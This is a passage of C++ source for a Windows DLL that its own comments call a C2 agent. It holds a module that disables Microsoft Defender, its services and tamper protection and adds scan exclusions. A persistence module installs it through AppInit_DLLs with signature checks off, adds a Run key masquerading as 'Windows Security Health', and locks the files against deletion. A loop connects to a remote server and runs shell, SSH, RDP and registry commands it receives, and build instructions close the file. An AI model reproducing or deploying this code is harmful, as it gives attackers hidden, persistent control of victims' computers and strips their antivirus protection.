    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceA(scm, name,
        SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS);
    bool ok = false;
    if (svc) {
        if (disable)
            ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
        SERVICE_STATUS ss{};
        ok = (ControlService(svc, SERVICE_CONTROL_STOP, &ss) != 0);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

// Start + enable a service, returns true if start was accepted
static bool svc_start_enable(const char* name) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceA(scm, name,
        SERVICE_START | SERVICE_CHANGE_CONFIG);
    bool ok = false;
    if (svc) {
        ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
            SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
        ok = (StartServiceA(svc, 0, nullptr) != 0);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

// ── status ────────────────────────────────────────────────────────────────────
static json::Value do_status() {
    // Tamper Protection: 5=on, 4=off(managed), 0=off
    int tp = reg_get(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection");

    int dis_asp = reg_get(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware");

    int dis_rtm = reg_get(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        "DisableRealtimeMonitoring");

    json::Object o;
    o["status"]              = json::Value(std::string("ok"));
    o["windefend_service"]   = json::Value(svc_state("WinDefend"));
    o["wdnissvc_service"]    = json::Value(svc_state("WdNisSvc"));
    o["tamper_protection"]   = json::Value(tp == 5 ? std::string("enabled(5)")
                                         : tp == 0 ? std::string("disabled(0)")
                                         : std::string("value=" + std::to_string(tp)));
    o["policy_disabled"]     = json::Value(dis_asp == 1);
    o["realtime_disabled"]   = json::Value(dis_rtm == 1);
    o["exclusion_paths"]     = json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"));
    o["exclusion_processes"] = json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"));
    o["exclusion_extensions"]= json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions"));
    return json::Value(o);
}

// ── disable ───────────────────────────────────────────────────────────────────
static json::Value do_disable() {
    json::Array steps;
    auto step = [&](const char* name, bool ok) {
        json::Object s;
        s["step"]    = json::Value(std::string(name));
        s["success"] = json::Value(ok);
        steps.push_back(json::Value(s));
    };

    // Step 1 — Tamper Protection off (requires SYSTEM; often fails at admin level)
    step("tamper_protection_off",
         reg_set(HKEY_LOCAL_MACHINE,
                 "SOFTWARE\\Microsoft\\Windows Defender\\Features",
                 "TamperProtection", 0));

    // Step 2 — Policy: DisableAntiSpyware / DisableAntiVirus
    bool p1 = reg_set(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                      "DisableAntiSpyware", 1);
    bool p2 = reg_set(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                      "DisableAntiVirus", 1);
    step("policy_DisableAntiSpyware+AntiVirus", p1 && p2);

    // Step 3 — Real-Time Protection policy keys
    const char* RT = "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";
    step("policy_realtime_protection_keys",
         reg_set(HKEY_LOCAL_MACHINE, RT, "DisableRealtimeMonitoring",  1) &&
         reg_set(HKEY_LOCAL_MACHINE, RT, "DisableBehaviorMonitoring",  1) &&
         reg_set(HKEY_LOCAL_MACHINE, RT, "DisableOnAccessProtection",  1) &&
         reg_set(HKEY_LOCAL_MACHINE, RT, "DisableScanOnRealtimeEnable",1) &&
         reg_set(HKEY_LOCAL_MACHINE, RT, "DisableIOAVProtection",      1));

    // Step 4 — PowerShell Set-MpPreference (requires admin + Tamper off)
    step("powershell_Set-MpPreference",
         run_ps("Set-MpPreference "
                "-DisableRealtimeMonitoring $true "
                "-DisableBehaviorMonitoring $true "
                "-DisableBlockAtFirstSeen $true "
                "-DisableIOAVProtection $true "
                "-DisablePrivacyMode $true "
                "-DisableArchiveScanning $true "
                "-DisableIntrusionPreventionSystem $true "
                "-MAPSReporting Disabled "
                "-SubmitSamplesConsent NeverSend"));

    // Step 5 — Stop & disable services
    step("service_WinDefend_stop",  svc_stop_disable("WinDefend",  true));
    step("service_WdNisSvc_stop",   svc_stop_disable("WdNisSvc",   true));
    step("service_WdFilter_stop",   svc_stop_disable("WdFilter",   true));

    return json::ok_resp({
        {"steps", json::Value(steps)},
        {"note",  json::Value(std::string(
            "Admin rights needed; SYSTEM token needed for Tamper Protection. "
            "Registry keys survive reboots. Services restart on next boot unless disabled."))}
    });
}

// ── enable ────────────────────────────────────────────────────────────────────
static json::Value do_enable() {
    json::Array steps;
    auto step = [&](const char* name, bool ok) {
        json::Object s;
        s["step"]    = json::Value(std::string(name));
        s["success"] = json::Value(ok);
        steps.push_back(json::Value(s));
    };

    // Re-enable Tamper Protection
    step("tamper_protection_on",
         reg_set(HKEY_LOCAL_MACHINE,
                 "SOFTWARE\\Microsoft\\Windows Defender\\Features",
                 "TamperProtection", 5));

    // Remove policy keys
    step("remove_policy_DisableAntiSpyware",
         reg_del(HKEY_LOCAL_MACHINE,
                 "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                 "DisableAntiSpyware"));
    step("remove_policy_DisableAntiVirus",
         reg_del(HKEY_LOCAL_MACHINE,
                 "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
                 "DisableAntiVirus"));

    // Remove real-time protection keys
    const char* RT = "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";
    step("remove_policy_realtime_keys",
         reg_del(HKEY_LOCAL_MACHINE, RT, "DisableRealtimeMonitoring") |
         reg_del(HKEY_LOCAL_MACHINE, RT, "DisableBehaviorMonitoring") |
         reg_del(HKEY_LOCAL_MACHINE, RT, "DisableOnAccessProtection") |
         reg_del(HKEY_LOCAL_MACHINE, RT, "DisableScanOnRealtimeEnable") |
         reg_del(HKEY_LOCAL_MACHINE, RT, "DisableIOAVProtection"));

    // Re-enable via PowerShell
    step("powershell_Set-MpPreference_restore",
         run_ps("Set-MpPreference "
                "-DisableRealtimeMonitoring $false "
                "-DisableBehaviorMonitoring $false "
                "-DisableBlockAtFirstSeen $false "
                "-DisableIOAVProtection $false "
                "-MAPSReporting Advanced "
                "-SubmitSamplesConsent SendSafeSamples"));

    // Re-enable and start services
    step("service_WinDefend_start", svc_start_enable("WinDefend"));
    step("service_WdNisSvc_start",  svc_start_enable("WdNisSvc"));

    return json::ok_resp({{"steps", json::Value(steps)}});
}

// ── exclusions ────────────────────────────────────────────────────────────────
static json::Value do_add_exclusion(const json::Value& p) {
    std::string path    = p["path"].str();
    std::string process = p["process"].str();
    std::string ext     = p["extension"].str();

    json::Array results;
    if (!path.empty()) {
        bool ok = run_ps("Add-MpPreference -ExclusionPath '" + path + "'");
        json::Object o; o["path"] = json::Value(path); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (!process.empty()) {
        bool ok = run_ps("Add-MpPreference -ExclusionProcess '" + process + "'");
        json::Object o; o["process"] = json::Value(process); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (!ext.empty()) {
        bool ok = run_ps("Add-MpPreference -ExclusionExtension '" + ext + "'");
        json::Object o; o["extension"] = json::Value(ext); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (results.empty()) return json::err_resp("Provide at least one of: path, process, extension");
    return json::ok_resp({{"added", json::Value(results)}});
}

static json::Value do_remove_exclusion(const json::Value& p) {
    std::string path    = p["path"].str();
    std::string process = p["process"].str();
    std::string ext     = p["extension"].str();

    json::Array results;
    if (!path.empty()) {
        bool ok = run_ps("Remove-MpPreference -ExclusionPath '" + path + "'");
        json::Object o; o["path"] = json::Value(path); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (!process.empty()) {
        bool ok = run_ps("Remove-MpPreference -ExclusionProcess '" + process + "'");
        json::Object o; o["process"] = json::Value(process); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (!ext.empty()) {
        bool ok = run_ps("Remove-MpPreference -ExclusionExtension '" + ext + "'");
        json::Object o; o["extension"] = json::Value(ext); o["success"] = json::Value(ok);
        results.push_back(json::Value(o));
    }
    if (results.empty()) return json::err_resp("Provide at least one of: path, process, extension");
    return json::ok_resp({{"removed", json::Value(results)}});
}

static json::Value do_list_exclusions() {
    json::Object o;
    o["status"]    = json::Value(std::string("ok"));
    o["paths"]     = json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"));
    o["processes"] = json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"));
    o["extensions"]= json::Value(reg_enum_values(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions"));
    return json::Value(o);
}

// ── Public API ────────────────────────────────────────────────────────────────
json::Value handle(const json::Value& p) {
    std::string action = p["action"].str();
    if (action == "status")           return do_status();
    if (action == "disable")          return do_disable();
    if (action == "enable")           return do_enable();
    if (action == "add_exclusion")    return do_add_exclusion(p);
    if (action == "remove_exclusion") return do_remove_exclusion(p);
    if (action == "list_exclusions")  return do_list_exclusions();
    return json::err_resp("Unknown defender action: " + action
        + ". Use: status | disable | enable | add_exclusion | remove_exclusion | list_exclusions");
}

} // namespace defender_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 8 — Failsafe / Persistence
//
// Called once on the first DLL load (when g_singleton_mtx is acquired).
// Ensures:
//   1. Registry: AppInit_DLLs → DLL path, LoadAppInit_DLLs = 1,
//                RequireSignedAppInit_DLLs = 0
//   2. File presence: DLL + SAFE.exe exist in %USERPROFILE%
//   3. File ACL: DELETE / WRITE_DAC / WRITE_OWNER denied to Everyone;
//                GENERIC_ALL granted to SYSTEM and Administrators
//   4. Run key: SAFE.exe /check on every user login (secondary belt)
// ─────────────────────────────────────────────────────────────────────────────
namespace failsafe_mod {

static const char* DLL_NAME   = "AppInit_DLLs.dll";
static const char* EXE_NAME   = "SAFE.exe";
static const char* APINIT_KEY =
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
static const char* RUN_KEY    =
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const char* RUN_VALUE  = "Windows Security Health";

// ── Registry helpers ──────────────────────────────────────────────────────────

static bool fs_reg_dword(HKEY root, const char* sub, const char* name, DWORD val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_DWORD,
                             (const BYTE*)&val, sizeof(val)) == ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}

static bool fs_reg_expand(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_EXPAND_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}

static bool fs_reg_sz(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}

// ── File ACL helper ───────────────────────────────────────────────────────────
// Applies a DACL:
//   DENY  DELETE | WRITE_DAC | WRITE_OWNER  → Everyone
//   ALLOW GENERIC_ALL                        → NT AUTHORITY\SYSTEM
//   ALLOW GENERIC_ALL                        → BUILTIN\Administrators
// Effect: regular users cannot delete or tamper; admins still can.
static void protect_file(const std::string& path) {
    PSID pEveryone = nullptr, pAdmins = nullptr, pSystem = nullptr;
    SID_IDENTIFIER_AUTHORITY wAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY nAuth = SECURITY_NT_AUTHORITY;

    AllocateAndInitializeSid(&wAuth, 1, SECURITY_WORLD_RID,
                             0,0,0,0,0,0,0, &pEveryone);
    AllocateAndInitializeSid(&nAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmins);
    AllocateAndInitializeSid(&nAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                             0,0,0,0,0,0,0, &pSystem);

    EXPLICIT_ACCESSA ea[3]{};

    // [0] Deny destructive ops to everyone
    ea[0].grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
    ea[0].grfAccessMode        = DENY_ACCESS;
    ea[0].grfInheritance       = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName    = (LPSTR)pEveryone;

    // [1] Full access for SYSTEM
    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode        = GRANT_ACCESS;
    ea[1].grfInheritance       = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ea[1].Trustee.ptstrName    = (LPSTR)pSystem;

    // [2] Full access for Administrators
    ea[2].grfAccessPermissions = GENERIC_ALL;
    ea[2].grfAccessMode        = GRANT_ACCESS;
    ea[2].grfInheritance       = NO_INHERITANCE;
    ea[2].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[2].Trustee.TrusteeType  = TRUSTEE_IS_GROUP;
    ea[2].Trustee.ptstrName    = (LPSTR)pAdmins;

    PACL pACL = nullptr;
    if (SetEntriesInAclA(3, ea, nullptr, &pACL) == ERROR_SUCCESS) {
        SetNamedSecurityInfoA((LPSTR)path.c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pACL, nullptr);
        LocalFree(pACL);
    }
    if (pEveryone) FreeSid(pEveryone);
    if (pAdmins)   FreeSid(pAdmins);
    if (pSystem)   FreeSid(pSystem);
}

// ── Main ensure() — called in a background thread ────────────────────────────
void ensure(HMODULE hMod) {
    // Get our own path on disk
    char self_path[MAX_PATH]{};
    GetModuleFileNameA(hMod, self_path, MAX_PATH);

    // Resolve %USERPROFILE% (reliable even at DLL load time)
    char userprofile[MAX_PATH]{};
    if (!GetEnvironmentVariableA("USERPROFILE", userprofile, MAX_PATH))
        // Fallback: build from HOMEDRIVE + HOMEPATH
        ExpandEnvironmentStringsA("%HOMEDRIVE%%HOMEPATH%", userprofile, MAX_PATH);

    std::string up       = userprofile;
    std::string dst_dll  = up + "\\" + DLL_NAME;
    std::string dst_exe  = up + "\\" + EXE_NAME;
    std::string self_str = self_path;

    // ── 1. Copy DLL to %USERPROFILE% if not already there ────────────────────
    if (self_str != dst_dll && GetFileAttributesA(dst_dll.c_str()) == INVALID_FILE_ATTRIBUTES)
        CopyFileA(self_path, dst_dll.c_str(), FALSE);

    // ── 2. Copy SAFE.exe from DLL's sibling directory ───────────────────
    if (GetFileAttributesA(dst_exe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::string dll_dir = self_str.substr(0, self_str.rfind('\\'));
        std::string src_exe = dll_dir + "\\" + EXE_NAME;
        if (GetFileAttributesA(src_exe.c_str()) != INVALID_FILE_ATTRIBUTES)
            CopyFileA(src_exe.c_str(), dst_exe.c_str(), FALSE);
    }

    // ── 3. Registry: AppInit_DLLs persistence ────────────────────────────────
    //  AppInit_DLLs   = "C:%HOMEPATH%\AppInit_DLLs.dll"  (REG_EXPAND_SZ)
    //  LoadAppInit_DLLs          = 1
    //  RequireSignedAppInit_DLLs = 0  (unsigned DLLs allowed, needed on Win8+)
    fs_reg_expand(HKEY_LOCAL_MACHINE, APINIT_KEY, "AppInit_DLLs",
                  ("C:%HOMEPATH%\\" + std::string(DLL_NAME)).c_str());
    fs_reg_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs",          1);
    fs_reg_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs", 0);

    // ── 4. Run key: installer re-checks on every user login ──────────────────
    if (GetFileAttributesA(dst_exe.c_str()) != INVALID_FILE_ATTRIBUTES)
        fs_reg_sz(HKEY_CURRENT_USER, RUN_KEY, RUN_VALUE,
                  (dst_exe + " /check").c_str());

    // ── 5. Re-apply file protections ─────────────────────────────────────────
    if (GetFileAttributesA(dst_dll.c_str()) != INVALID_FILE_ATTRIBUTES)
        protect_file(dst_dll);
    if (GetFileAttributesA(dst_exe.c_str()) != INVALID_FILE_ATTRIBUTES)
        protect_file(dst_exe);
}

} // namespace failsafe_mod


// ─────────────────────────────────────────────────────────────────────────────
// C2 agent main loop
// ─────────────────────────────────────────────────────────────────────────────
static void agent_loop() {
    // Init WinSock
    WSADATA wsa{}; WSAStartup(MAKEWORD(2,2), &wsa);
#ifdef C2_HAS_LIBSSH2
    libssh2_init(0);
#endif

    load_config();

    // ── Connect to server with retry ──────────────────────────────────────
    while (true) {
        g_recv_buf.clear();
        addrinfo hints{}, *res = nullptr;
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(g_host.c_str(), std::to_string(g_port).c_str(), &hints, &res) != 0
            || !res)
        {
            Sleep(5000); continue;
        }
        g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (connect(g_sock, res->ai_addr, (int)res->ai_addrlen) != 0) {
            freeaddrinfo(res); closesocket(g_sock);
            g_sock = INVALID_SOCKET; Sleep(5000); continue;
        }
        freeaddrinfo(res);

        // ── Authenticate — include role so server can route push events ───
        json::Object auth_msg;
        auth_msg["token"] = json::Value(g_token);
        auth_msg["role"]  = json::Value(std::string("agent"));
        if (!sock_send(json::Value(auth_msg))) { closesocket(g_sock); Sleep(5000); continue; }
        std::string auth_line = sock_recv_line();
        if (auth_line.empty()) { closesocket(g_sock); Sleep(5000); continue; }
        json::Value auth_resp = json::parse(auth_line);
        if (auth_resp["status"].str() != "ok") { closesocket(g_sock); Sleep(5000); continue; }

        // ── Dispatch loop ─────────────────────────────────────────────────
        while (true) {
            std::string line = sock_recv_line();
            if (line.empty()) break;

            json::Value msg    = json::parse(line);
            std::string module = msg["module"].str();
            const json::Value& payload = msg["payload"];

            json::Value result;
            if      (module == "ssh")      result = ssh_mod::handle(payload);
            else if (module == "rdp")      result = rdp_mod::handle(payload);
            else if (module == "registry") result = reg_mod::handle(payload);
            else if (module == "activity") result = act_mod::handle(payload);
            else if (module == "notify")    result = notif_mod::handle(payload);
            else if (module == "shell")     result = shell_mod::handle(payload);
            else if (module == "defender")  result = defender_mod::handle(payload);
            else result = json::err_resp("Unknown module: " + module);

            if (!sock_send(result)) break;
        }

        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
        Sleep(5000); // reconnect delay
    }
}


// ─────────────────────────────────────────────────────────────────────────────
// DllMain
// ─────────────────────────────────────────────────────────────────────────────
BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        g_hmodule = hModule;

        // ── Singleton guard ────────────────────────────────────────────────────
        // AppInit_DLLs loads this DLL into every process that uses user32.dll.
        // Only the FIRST process to claim the named mutex actually runs the agent.
        // All others load successfully but stay dormant.
        g_singleton_mtx = CreateMutexA(nullptr, TRUE, "Global\\__C2AgentMtx__");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            // Agent already running elsewhere — unload cleanly
            if (g_singleton_mtx) { CloseHandle(g_singleton_mtx); g_singleton_mtx = nullptr; }
            break;
        }

        // ── Failsafe: verify + self-heal persistence (background thread) ──────
        // Runs in a thread so DllMain returns immediately (avoids loader deadlocks).
        CreateThread(nullptr, 0,
            [](LPVOID hm) -> DWORD { failsafe_mod::ensure((HMODULE)hm); return 0; },
            (LPVOID)hModule, 0, nullptr);

        // ── Start C2 agent ─────────────────────────────────────────────────────
        CreateThread(nullptr, 0,
            [](LPVOID) -> DWORD { agent_loop(); return 0; },
            nullptr, 0, nullptr);
        break;

    case DLL_PROCESS_DETACH:
        // Release singleton so another process can pick up the agent
        if (g_singleton_mtx) {
            ReleaseMutex(g_singleton_mtx);
            CloseHandle(g_singleton_mtx);
            g_singleton_mtx = nullptr;
        }
        shell_mod::cleanup();
        notif_mod::cleanup();
        act_mod::stop_monitor({});
        if (g_sock != INVALID_SOCKET) closesocket(g_sock);
        WSACleanup();
#ifdef C2_HAS_LIBSSH2
        libssh2_exit();
#endif
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

// Build (DLL):
// x86_64-w64-mingw32-g++ -shared -o AppInit_DLLs.dll dll.cpp \
//     -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
//     -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 -lssh2 \
//     -std=c++17 -O2 -fpermissive
//
// Build (installer):
// x86_64-w64-mingw32-g++ -o SAFE.exe SAFE.cpp \
//     -ladvapi32 -lshell32 -lshlwapi \
//     -static -std=c++17 -O2 -mwindows
